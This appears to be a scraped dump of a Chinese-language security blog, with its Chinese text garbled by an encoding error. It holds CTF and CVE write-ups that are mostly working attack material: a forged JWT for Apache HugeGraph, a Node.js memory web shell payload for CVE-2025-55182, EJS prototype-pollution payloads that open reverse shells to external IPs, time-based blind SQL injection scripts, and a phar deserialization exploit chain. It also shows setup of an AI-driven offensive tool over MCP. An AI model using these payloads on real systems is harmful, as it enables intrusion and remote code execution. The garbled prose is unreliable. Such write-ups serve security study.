credentials&quot;); } è¿™é‡Œä»AUTHORIZATIONä¸­æ‹¿å‡ºTokenï¼Œé™åˆ¶äº†Httpå¤´è¦ä¸ºAUTHORIZATIONå¹¶ä¸”ä¸ä¸ºç©ºã€‚ ç„¶åå¼€å§‹åˆ¤æ–­tokençš„å¼€å¤´ 1234567891011121314151617181920212223if (auth.startsWith(BASIC_AUTH_PREFIX)) { auth = auth.substring(BASIC_AUTH_PREFIX.length()); auth = new String(DatatypeConverter.parseBase64Binary(auth), Charsets.ASCII_CHARSET); String[] values = auth.split(&quot;:&quot;); if (values.length != 2) { throw new BadRequestException(&quot;Invalid syntax for username and password&quot;); } final String username = values[0]; final String password = values[1]; if (StringUtils.isEmpty(username) || StringUtils.isEmpty(password)) { throw new BadRequestException(&quot;Invalid syntax for username and password&quot;); } credentials.put(HugeAuthenticator.KEY_USERNAME, username); credentials.put(HugeAuthenticator.KEY_PASSWORD, password); } else if (auth.startsWith(BEARER_TOKEN_PREFIX)) { String token = auth.substring(BEARER_TOKEN_PREFIX.length()); credentials.put(HugeAuthenticator.KEY_TOKEN, token); } else { throw new BadRequestException(&quot;Only HTTP Basic or Bearer authentication is supported&quot;); } é¦–å…ˆç¬¬ä¸€ä¸ªifåˆ¤æ–­Authorization å¤´æ˜¯å¦ä¸ºBasicï¼Œå¦‚æœä¸ºBasicå°±è¿›è¡Œè´¦å·å¯†ç çš„åŸå§‹å­—ç¬¦ä¸²åˆ¤æ–­ï¼Œæ‰€ä»¥å¼€å¤´ä¸èƒ½ä¸ºbaseã€‚ ç¬¬äºŒç§åˆ¤æ–­Authorization å¤´æ˜¯å¦ä¸ºBearerï¼Œè¿™ç§å°±æ˜¯å¯ä»¥åˆ©ç”¨çš„JWTè®¤è¯ã€‚ æ¼æ´å¤ç°ä½¿ç”¨é»˜è®¤å¯†åŒ™æ„é€ jwt æŒ‰åˆ†ææ„é€ token 1Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiJhZG1pbiIsImV4cCI6OTczOTUyNDU2N30.Kc_6-EtUz3J8lS9VZEfsEe4BFYz-GIg7SFFfGQ5VNeE æ— tokenæ—¶,è¿”å›æŠ¥é”™json åŠ å…¥æ„é€ tokenã€‚ !","link":"/2025/03/03/Apache%20HugeGraph%20JWT%20Token%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(CVE-2024-43441)/"},{"title":"","text":"jså†…å­˜é©¬-CVE-2025-55182 ç‰ˆæœ¬1ä¸çŸ¥é“æ˜¯å¤ªé•¿äº†è¿˜æ˜¯ä»€ä¹ˆåŸå›  1234567891011121314{ &quot;then&quot;: &quot;$1:__proto__:then&quot;, &quot;status&quot;: &quot;resolved_model&quot;, &quot;reason&quot;: -1, &quot;value&quot;: &quot;{\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;}&quot;, &quot;_response&quot;: { &quot;_prefix&quot;: &quot;(async()=&gt;{const http=await import('node:http');const url=await import('node:url');const cp=await import('node:child_process');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='/deep'){const cmd=parsedUrl.query.cmd||'whoami';cp.exec(cmd,(err,stdout,stderr)=&gt;{res.writeHead(200,{'Content-Type':'application/json'});res.end(JSON.stringify({success:!err,stdout,stderr,error:err?err.message:null}));});return true;}}return originalEmit.apply(this,arguments);};})();&quot;, &quot;_chunks&quot;: &quot;$Q2&quot;, &quot;_formData&quot;: { &quot;get&quot;: &quot;$1:constructor:constructor&quot; } }}{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;value&quot;:&quot;{\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;(async()=&gt;{require('http').Server.prototype.emit=function(e,...a){if(e=='request'&amp;&amp;require('url').parse(a[0].url).pathname=='/shell'){require('child_process').exec(a[0].query.c||'id',(e,o,s)=&gt;a[1].end(JSON.stringify({o,s})));return true}return this.__proto__.emit.apply(this,arguments)}})();&quot;,&quot;_chunks&quot;:&quot;$Q&quot;}} CVE-2025-55182 æ˜¥ç§‹äº‘é•œå¤ç° 123456789101112131415161718POST /apps HTTP/2Host: eci-2zeiverm334jp4jylqln.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0Accept-Encoding: gzip, deflateNext-Action: xX-Nextjs-Request-Id: test123Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryContent-Length: 594------WebKitFormBoundaryContent-Disposition: form-data; name=&quot;0&quot;{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;value&quot;:&quot;{\\&quot;then\\&quot;:\\&quot;$B1337\\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;(async()=&gt;{require('http').Server.prototype.emit=function(e,...a){if(e=='request'&amp;&amp;require('url').parse(a[0].url).pathname=='/shell'){require('child_process').exec(a[0].query.c||'id',(e,o,s)=&gt;a[1].end(JSON.stringify({o,s})));return true}return this.__proto__.emit.apply(this,arguments)}})();&quot;,&quot;_chunks&quot;:&quot;$Q&quot;}}------WebKitFormBoundaryContent-Disposition: form-data; name=&quot;1&quot;&quot;$@0&quot;------WebKitFormBoundary-- è®¿é—®è·å–flag 1/deep?cmd=cd%20../../;cat%20/flag","link":"/2025/12/11/js%E5%86%85%E5%AD%98%E9%A9%AC-CVE-2025-55182/"},{"title":"","text":"hexstrike-ai kaliä½œä¸ºæœåŠ¡ç«¯ï¼ŒWindowsä½œä¸ºå®¢æˆ·ç«¯kaliçš„IPï¼š192.168.1.101 å¯åŠ¨hexstrlike-ai 12345cd /home/challenge/Desktop/hexstrike-aisource venv/bin/activatepython3 hexstrike_server.py å®¢æˆ·ç«¯å¯åŠ¨ 1python hexstrike_mcp.py --server http://192.168.1.101:8888 --debug traeçš„mcpé…ç½®æ–‡ä»¶ 123456789101112131415{ &quot;mcpServers&quot;: { &quot;hexstrike-ai&quot;: { &quot;command&quot;: &quot;D:\\\\env\\\\Python\\\\Python313\\\\python.exe&quot;, &quot;args&quot;: [ &quot;D:\\\\hexstrike-ai\\\\hexstrike_mcp.py&quot;, &quot;--server&quot;, &quot;http://192.168.1.101:8888&quot; ], &quot;description&quot;: &quot;HexStrike AI v6.0 - Advanced Cybersecurity Automation Platform&quot;, &quot;timeout&quot;: 300, &quot;disabled&quot;: false } }} MCPè°ƒè¯•å·¥å…·å¯åŠ¨ï¼Œè¿™ä¸ªé»˜è®¤å¯åŠ¨æœ€æ–°ç‰ˆæœ¬ 1npx @modelcontextprotocol/inspector ç‚¹é“¾æ¥è¿›å…¥æµè§ˆå™¨ å¦‚ä¸‹æ‰€ç¤º Command 1D:\\env\\Python\\Python313\\python.exe Arguments 1D:\\\\hexstrike-ai\\\\hexstrike_mcp.py --server http://192.168.1.101:8888 ç„¶åå°±å¯ä»¥ç”¨è¿™ä¸ªé¡µé¢å»å¾®è°ƒMCPäº†åƒä¸€äº›ä»€ä¹ˆæç¤ºè¯ä¹‹ç±»çš„","link":"/2025/12/11/hexstrlike-ai/"},{"title":"","text":"Dest0g3 520-web ezipâ€“å°±æ˜¯æ–‡ä»¶ä¸Šä¼ ææƒ010æ‰“å¼€æ¶©å›¾å‘ç°åé¢åˆbase64 1234567891011121314151617181920dXBsb2FkLnBocDoKPD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwppbmNsdWRlKCJ6aXAucGhwIik7CmlmKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7CiAgICBpZihzdHJzdHIoJF9GSUxFU1snZmlsZSddWyduYW1lJ10sIi4uIil8fHN0cnN0cigkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSwiLyIpKXsKICAgICAgICBlY2hvICJoYWNrZXIhISI7CiAgICAgICAgZXhpdDsKICAgIH0KICAgIGlmKHBhdGhpbmZvKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddLCBQQVRISU5GT19FWFRFTlNJT04pIT0iemlwIil7CiAgICAgICAgZWNobyAib25seSB6aXAhISI7CiAgICAgICAgZXhpdDsKICAgIH0KICAgICRNeXppcCA9IG5ldyB6aXAoJF9GSUxFU1snZmlsZSddWyduYW1lJ10pOwogICAgbWtkaXIoJE15emlwLT5wYXRoKTsKICAgIG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICcuLycuJE15emlwLT5wYXRoLicvJyAuICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKTsKICAgIGVjaG8gIlRyeSB0byB1bnppcCB5b3VyIHppcCB0byAvIi4kTXl6aXAtPnBhdGguIjxicj4iOwogICAgaWYoJE15emlwLT51bnppcCgpKXtlY2hvICJTdWNjZXNzIjt9ZWxzZXtlY2hvICJmYWlsZWQiO30KfQoKemlwLnBocDoKPD9waHAKY2xhc3MgemlwCnsKICAgIHB1YmxpYyAkemlwX25hbWU7CiAgICBwdWJsaWMgJHBhdGg7CiAgICBwdWJsaWMgJHppcF9tYW5hZ2VyOwoKICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkemlwX25hbWUpewogICAgICAgICR0aGlzLT56aXBfbWFuYWdlciA9IG5ldyBaaXBBcmNoaXZlKCk7CiAgICAgICAgJHRoaXMtPnBhdGggPSAkdGhpcy0+Z2VuX3BhdGgoKTsKICAgICAgICAkdGhpcy0+emlwX25hbWUgPSAkemlwX25hbWU7CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gZ2VuX3BhdGgoKXsKICAgICAgICAkY2hhcnM9ImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IjsKICAgICAgICAkbmV3Y2hhcnM9c3RyX3NwbGl0KCRjaGFycyk7CiAgICAgICAgc2h1ZmZsZSgkbmV3Y2hhcnMpOwogICAgICAgICRjaGFyc19rZXk9YXJyYXlfcmFuZCgkbmV3Y2hhcnMsMTUpOwogICAgICAgICRmbnN0ciA9ICIiOwogICAgICAgIGZvcigkaT0wOyRpPDE1OyRpKyspewogICAgICAgICAgICAkZm5zdHIuPSRuZXdjaGFyc1skY2hhcnNfa2V5WyRpXV07CiAgICAgICAgfQogICAgICAgIHJldHVybiBtZDUoJGZuc3RyLnRpbWUoKS5taWNyb3RpbWUoKSoxMDAwMDApOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBkZWxkaXIoJGRpcikgewogICAgICAgIC8v5YWI5Yig6Zmk55uu5b2V5LiL55qE5paH5Lu277yaCiAgICAgICAgJGRoID0gb3BlbmRpcigkZGlyKTsKICAgICAgICB3aGlsZSAoJGZpbGUgPSByZWFkZGlyKCRkaCkpIHsKICAgICAgICAgICAgaWYoJGZpbGUgIT0gIi4iICYmICRmaWxlIT0iLi4iKSB7CiAgICAgICAgICAgICAgICAkZnVsbHBhdGggPSAkZGlyLiIvIi4kZmlsZTsKICAgICAgICAgICAgICAgIGlmKCFpc19kaXIoJGZ1bGxwYXRoKSkgewogICAgICAgICAgICAgICAgICAgIHVubGluaygkZnVsbHBhdGgpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZGVsZGlyKCRmdWxscGF0aCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2xvc2VkaXIoJGRoKTsKICAgIH0KICAgIGZ1bmN0aW9uIGRpcl9saXN0KCRkaXJlY3RvcnkpCiAgICB7CiAgICAgICAgJGFycmF5ID0gW107CgogICAgICAgICRkaXIgPSBkaXIoJGRpcmVjdG9yeSk7CiAgICAgICAgd2hpbGUgKCRmaWxlID0gJGRpci0+cmVhZCgpKSB7CiAgICAgICAgICAgIGlmICgkZmlsZSAhPT0gJy4nICYmICRmaWxlICE9PSAnLi4nKSB7CiAgICAgICAgICAgICAgICAkYXJyYXlbXSA9ICRmaWxlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYXJyYXk7CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gdW56aXAoKQogICAgewogICAgICAgICRmdWxscGF0aCA9ICIvdmFyL3d3dy9odG1sLyIuJHRoaXMtPnBhdGguIi8iLiR0aGlzLT56aXBfbmFtZTsKICAgICAgICAkd2hpdGVfbGlzdCA9IFsnanBnJywncG5nJywnZ2lmJywnYm1wJ107CiAgICAgICAgJHRoaXMtPnppcF9tYW5hZ2VyLT5vcGVuKCRmdWxscGF0aCk7CiAgICAgICAgZm9yICgkaSA9IDA7JGkgPCAkdGhpcy0+emlwX21hbmFnZXItPmNvdW50KCk7JGkgKyspIHsKICAgICAgICAgICAgaWYgKHN0cnN0cigkdGhpcy0+emlwX21hbmFnZXItPmdldE5hbWVJbmRleCgkaSksIi4uLyIpKXsKICAgICAgICAgICAgICAgIGVjaG8gInlvdSBiYWQgYmFkIjsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZighJHRoaXMtPnppcF9tYW5hZ2VyLT5leHRyYWN0VG8oJHRoaXMtPnBhdGgpKXsKICAgICAgICAgICAgZWNobyAiVW56aXAgdG8gLyIuJHRoaXMtPnBhdGguIi8gZmFpbGVkIjsKICAgICAgICAgICAgZXhpdDsKICAgICAgICB9CiAgICAgICAgQHVubGluaygkZnVsbHBhdGgpOwogICAgICAgICRmaWxlX2xpc3QgPSAkdGhpcy0+ZGlyX2xpc3QoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIpOwogICAgICAgIGZvcigkaT0wOyRpPHNpemVvZigkZmlsZV9saXN0KTskaSsrKXsKICAgICAgICAgICAgaWYoaXNfZGlyKCR0aGlzLT5wYXRoLiIvIi4kZmlsZV9saXN0WyRpXSkpewogICAgICAgICAgICAgICAgZWNobyAiZGlyPyBJIGRlbGV0ZWQgYWxsIHRoaW5ncyBpbiBpdCIuIjxicj4iO0AkdGhpcy0+ZGVsZGlyKCIvdmFyL3d3dy9odG1sLyIuJHRoaXMtPnBhdGguIi8iLiRmaWxlX2xpc3RbJGldKTtAcm1kaXIoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIuJGZpbGVfbGlzdFskaV0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICBpZighaW5fYXJyYXkocGF0aGluZm8oJGZpbGVfbGlzdFskaV0sIFBBVEhJTkZPX0VYVEVOU0lPTiksJHdoaXRlX2xpc3QpKSB7ZWNobyAib25seSBpbWFnZSEhISBJIGRlbGV0ZWQgaXQgZm9yIHlvdSIuIjxicj4iO0B1bmxpbmsoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIuJGZpbGVfbGlzdFskaV0pO30KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKCiAgICB9CgoKfQo=#upload.php:&lt;?phperror_reporting(0);include(&quot;zip.php&quot;);if(isset($_FILES['file']['name'])){ if(strstr($_FILES['file']['name'],&quot;..&quot;)||strstr($_FILES['file']['name'],&quot;/&quot;)){ echo &quot;hacker!!&quot;; exit; } if(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION)!=&quot;zip&quot;){ echo &quot;only zip!!&quot;; exit; } $Myzip = new zip($_FILES['file']['name']); mkdir($Myzip-&gt;path); move_uploaded_file($_FILES['file']['tmp_name'], './'.$Myzip-&gt;path.'/' . $_FILES['file']['name']); echo &quot;Try to unzip your zip to /&quot;.$Myzip-&gt;path.&quot;&lt;br&gt;&quot;; if($Myzip-&gt;unzip()){echo &quot;Success&quot;;}else{echo &quot;failed&quot;;}} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#zip.php:&lt;?phpclass zip{ public $zip_name; public $path; public $zip_manager; public function __construct($zip_name){ $this-&gt;zip_manager = new ZipArchive(); $this-&gt;path = $this-&gt;gen_path(); $this-&gt;zip_name = $zip_name; } public function gen_path(){ $chars=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;; $newchars=str_split($chars); shuffle($newchars); $chars_key=array_rand($newchars,15); $fnstr = &quot;&quot;; for($i=0;$i&lt;15;$i++){ $fnstr.=$newchars[$chars_key[$i]]; } return md5($fnstr.time().microtime()*100000); } public function deldir($dir) { //å…ˆåˆ é™¤ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š $dh = opendir($dir); while ($file = readdir($dh)) { if($file != &quot;.&quot; &amp;&amp; $file!=&quot;..&quot;) { $fullpath = $dir.&quot;/&quot;.$file; if(!is_dir($fullpath)) { unlink($fullpath); } else { $this-&gt;deldir($fullpath); } } } closedir($dh); } function dir_list($directory) { $array = []; $dir = dir($directory); while ($file = $dir-&gt;read()) { if ($file !== '.' &amp;&amp; $file !== '..') { $array[] = $file; } } return $array; } public function unzip() { $fullpath = &quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$this-&gt;zip_name; $white_list = ['jpg','png','gif','bmp']; $this-&gt;zip_manager-&gt;open($fullpath); for ($i = 0;$i &lt; $this-&gt;zip_manager-&gt;count();$i ++) { if (strstr($this-&gt;zip_manager-&gt;getNameIndex($i),&quot;../&quot;)){ echo &quot;you bad bad&quot;; return false; } } if(!$this-&gt;zip_manager-&gt;extractTo($this-&gt;path)){ echo &quot;Unzip to /&quot;.$this-&gt;path.&quot;/ failed&quot;; exit; } @unlink($fullpath); $file_list = $this-&gt;dir_list(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;); for($i=0;$i&lt;sizeof($file_list);$i++){ if(is_dir($this-&gt;path.&quot;/&quot;.$file_list[$i])){ echo &quot;dir? I deleted all things in it&quot;.&quot;&lt;br&gt;&quot;;@$this-&gt;deldir(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);@rmdir(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]); } else{ if(!in_array(pathinfo($file_list[$i], PATHINFO_EXTENSION),$white_list)) {echo &quot;only image!!! I deleted it for you&quot;.&quot;&lt;br&gt;&quot;;@unlink(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);} } } return true; }} åˆ›å»ºä¸€ä¸ªä¸èƒ½è§£å‹çš„å‹ç¼©åŒ… è¿™é‡Œè§£å‹å¤±è´¥ ä½†æ˜¯è§£å‹åéƒ¨åˆ†æ–‡ä»¶åç›´æ¥exit ä»è€Œç»•è¿‡åç»­çš„unlink /4df1bef9d0c0ef26403ff10f6f431309/she.php å‘ç°æƒé™ä¸å¤Ÿï¼Œäºæ˜¯ææƒ 1find / -user root -perm -4000 -print 2&gt;/dev/null nlæœ‰å¯è¯»æƒé™ 1nl /f* phpdest123456&lt;?php highlight_file(__FILE__); require_once 'flag.php'; if(isset($_GET['file'])) { require_once($_GET['file']); } 1?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php â€‹ easysqlè·‘è„šæœ¬å³å¯ 1234567891011121314151617181920212223242526272829303132import requestsimport timeurl=&quot;http://32a96c02-6636-425a-b16a-047c7164e64d.node5.buuoj.cn:81/&quot;def SQL_injection(): res=&quot;&quot; for i in range(1,100): mid=32 while mid&lt;128: #payload=&quot;'||if(ascii(mid((database()),%d,1))=%d,benchmark(2500000,sha(1)),0)||'&quot;%(i,mid) #database()=ctf #payload=&quot;'||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) #flaggg,user #payload=&quot;'||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name='flaggg')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) #cmd payload=&quot;'||if(ascii(mid((select(cmd)from(flaggg)),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) print(payload) begin_time=time.time() data={&quot;username&quot;:payload, &quot;password&quot;:&quot;test&quot;} r=requests.post(url=url, data=data) end_time=time.time() #print(end_time-begin_time) if (end_time-begin_time)&gt;1: res+=chr(mid) break mid+=1 if(mid==128): break print(res) print(res)if __name__==&quot;__main__&quot;: SQL_injection() Really Easy SQLå…ˆè¯•ä¸€ä¸‹æœ‰æ²¡æœ‰è¿‡æ»¤ å‘ç°è¾“å…¥ä»€ä¹ˆéƒ½æ˜¯æŠ¥é”™ ç›´æ¥æ—¶é—´ç›²æ³¨å§ 1234567891011121314151617181920212223242526272829import requestsimport timeurl=&quot;http://a521de12-f1b9-42f6-b179-2f488565741b.node5.buuoj.cn:81/&quot;def SQL_injection(): res=&quot;&quot; # å¤–å±‚å¾ªç¯ï¼šéå†å­—ç¬¦ä½ç½®ï¼ˆ1åˆ°99ï¼Œå‡è®¾flagé•¿åº¦ä¸è¶…è¿‡99ï¼‰ for i in range(4,100): mid=32 # å†…å±‚å¾ªç¯ï¼šéå†å½“å‰ä½ç½®çš„å¯èƒ½ASCIIç ï¼ˆ32-127ï¼Œè¦†ç›–æ‰€æœ‰å¯è§å­—ç¬¦ï¼‰ while mid&lt;128: #payload=&quot;'||if(ascii(mid((database()),%d,1))=%d,benchmark(2500000,sha(1)),0)||'&quot;%(i,mid) #database()=ctf #payload=&quot;'||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) #flaggg,user #payload=&quot;'||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name='flaggg')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) #cmd payload=&quot;'||if(ascii(mid((select(cmd)from(flaggg)),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) print(payload) begin_time=time.time() data={&quot;username&quot;:payload, &quot;password&quot;:&quot;test&quot;} r=requests.post(url=url, data=data) end_time=time.time() #print(end_time-begin_time) if (end_time-begin_time)&gt;1: res+=chr(mid) break mid+=1 if(mid==128): break print(res) print(res) if __name__==&quot;__main__&quot;: SQL_injection() æœåŠ¡å™¨ä¸€ç›´å¡çˆ†æ¢forå¾ªç¯å‚æ•°æ³¨å…¥ 1flag{790b46b0-7256-4c78-96be-2f2d043c3132} NodeSoEasy ç”¨çš„ejsæ¨¡æ¿ /ç›®å½•ä¸‹å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ eJS RCE 1{&quot;__proto__&quot;:{&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/124.222.136.33/1337 0&gt;&amp;1\\&quot;');&quot;,&quot;compileDebug&quot;:true}} å‘åŒ…ç”¨application/json å‚è€ƒï¼šhttps://www.anquanke.com/post/id/236354 BUUå¼¹ä¸äº†shell æš‚æ—¶æ²¡æ‹›è§£å†³ 1234567891011121314POST / HTTP/1.1Host: 9339894c-2cec-42a6-a9f6-b8017abf9468.node5.buuoj.cn:81Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh,zh-CN;q=0.9Connection: keep-aliveReferer: http://9339894c-2cec-42a6-a9f6-b8017abf9468.node5.buuoj.cn:81/Content-Type: application/jsonContent-Length: 145{&quot;__proto__&quot;:{&quot;client&quot;:{},&quot;escapeFunction&quot;:&quot;1; require('child_process').exec('bash -i &gt;&amp; /dev/tcp/10.88.15.15/1337 0&gt;&amp;1');&quot;,&quot;compileDebug&quot;:true}} PharPOP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?phphighlight_file(__FILE__);function waf($data){ if (is_array($data)){ die(&quot;Cannot transfer arrays&quot;); } // iè¡¨ç¤ºå¤§å°å†™ä¸æ•æ„Ÿ if (preg_match('/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i', $data)) { die(&quot;You can't do&quot;); }}class air{ public $p; public function __set($p, $value) { $p = $this-&gt;p-&gt;act; echo new $p($value); }}class tree{ public $name; public $act; public function __destruct() { return $this-&gt;name(); } public function __call($name, $arg){ $arg[1] =$this-&gt;name-&gt;$name; }}class apple { public $xxx; public $flag; public function __get($flag) { $this-&gt;xxx-&gt;$flag = $this-&gt;flag; }}class D { public $start; public function __destruct(){ $data = $_POST[0]; if ($this-&gt;start == 'w') { waf($data); $filename = &quot;/tmp/&quot;.md5(rand()).&quot;.jpg&quot;; file_put_contents($filename, $data); echo $filename; } else if ($this-&gt;start == 'r') { waf($data); $f = file_get_contents($data); if($f){ echo &quot;It is file&quot;; } else{ echo &quot;You can look at the others&quot;; } } }}class banana { public function __get($name){ return $this-&gt;$name; }}// flag in ///å…¥å£ï¼šPOST[1]é•¿åº¦&lt;55åˆ™ååºåˆ—åŒ–if(strlen($_POST[1]) &lt; 55) { $a = unserialize($_POST[1]);}else{ echo &quot;str too long&quot;;}throw new Error(&quot;start&quot;);?&gt; 1tree._destruct-&gt;tree._call-&gt;apple._get-&gt;air._set ç„¶åç»•è¿‡throwï¼Œthrowä¼šé˜»ç¢ææ„å‡½æ•°è¿›è¡Œï¼Œé€šè¿‡gcåƒåœ¾å›æ”¶æå‰è§¦å‘ææ„å‡½æ•° ç»•è¿‡wafï¼Œwafè¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œä½¿ç”¨gzipå‘½ä»¤å¤„ç†pharæ–‡ä»¶ 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass air{ public $p;} class tree{ public $name; public $act;} class apple { public $xxx; public $flag;} $a = new tree;$b = new apple;$c = new air;$d = new tree;// $d-&gt;act='FilesystemIterator';// $c-&gt;p = $d;// $b-&gt;xxx = $c;// $b-&gt;flag = 'glob:///*f*';// $a-&gt;name = $b;$d-&gt;act='SplFileObject';$c-&gt;p = $d;$b-&gt;xxx = $c;$b-&gt;flag = &quot;/fflaggg&quot;;$a-&gt;name = $b; $phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub$phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶,éšä¾¿æ–°å»ºä¸€ä¸ªæ–‡ä»¶å†…å®¹éšæ„$phar-&gt;stopBuffering(); ç”Ÿæˆçš„pharæ–‡ä»¶åœ¨010editorä¸­æ‰“å¼€ï¼Œåˆ å»æœ€åä¸€ä¸ª} ä¿®æ”¹ç­¾åå¹¶å‹ç¼©pharæ–‡ä»¶ 123456from hashlib import sha1f = open('phar.phar', 'rb').read() # ä¿®æ”¹å†…å®¹åçš„pharæ–‡ä»¶s = f[:-28] # è·å–è¦ç­¾åçš„æ•°æ®h = f[-8:] # è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†newf = s+sha1(s).digest()+h # æ•°æ® + ç­¾å + ç±»å‹ + GBMBopen('fixed_phar.phar', 'wb').write(newf) # å†™å…¥æ–°æ–‡ä»¶ è¿è¡Œé¡¹ç›®å¹¶ä¸‹è½½æºç  ä»¥urlç¼–ç å½¢å¼è¾“å‡ºæ–‡ä»¶å†…å®¹ 123456import urllib.parse with open(&quot;fixed_phar.phar.gz&quot;, 'rb') as fi: f = fi.read() ff = urllib.parse.quote(f) #è·å–ä¿¡æ¯ print(ff) è¿è¡Œé¡¹ç›®å¹¶ä¸‹è½½æºç  å†™å…¥pharæ–‡ä»¶ 